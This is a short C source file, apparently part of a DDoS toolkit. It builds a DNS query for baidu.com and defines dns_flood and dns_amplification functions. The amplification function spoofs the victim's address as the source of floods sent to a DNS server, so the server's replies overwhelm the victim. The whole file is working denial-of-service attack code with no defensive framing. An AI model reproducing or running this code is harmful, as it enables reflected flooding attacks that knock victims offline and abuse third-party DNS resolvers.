#include "common.h"

void dns_mktransid(void *data)
{
    *(ushort *)data = rand_u16();
}

void dns_mkrequest(struct bytevector *vec)
{
    const char *query = "\x05" "baidu" "\x03" "com";
    
    // header
    bytevector_append_u16(vec, 0); // transaction id
    bytevector_append_u16(vec, htons(0x0100)); // flags
    bytevector_append_u16(vec, htons(1)); // questions
    bytevector_append_u16(vec, htons(0));
    bytevector_append_u16(vec, htons(0));
    bytevector_append_u16(vec, htons(0));
    
    // question
    bytevector_append_str(vec, query);
    bytevector_append_u16(vec, htons(1));
    bytevector_append_u16(vec, htons(1));
}


void dns_flood(struct in_addr src, struct in_addr dst, struct ddos_flags flags, unsigned long long maxcount)
{
    struct bytevector vec;
    bytevector_init(&vec);
    dns_mkrequest(&vec);
    udp_flood(src, 0, dst, 53, bytevector_data(&vec), bytevector_size(&vec), dns_mktransid, flags, maxcount);
    bytevector_free(&vec);
}

void dns_amplification(struct in_addr dnsserver, struct in_addr dst, unsigned long long maxcount)
{
    struct ddos_flags flags;
    memset(&flags, 0, sizeof(flags));  
    flags.rand_sport = 1;
    dns_flood(dst, dnsserver, flags, maxcount);
}

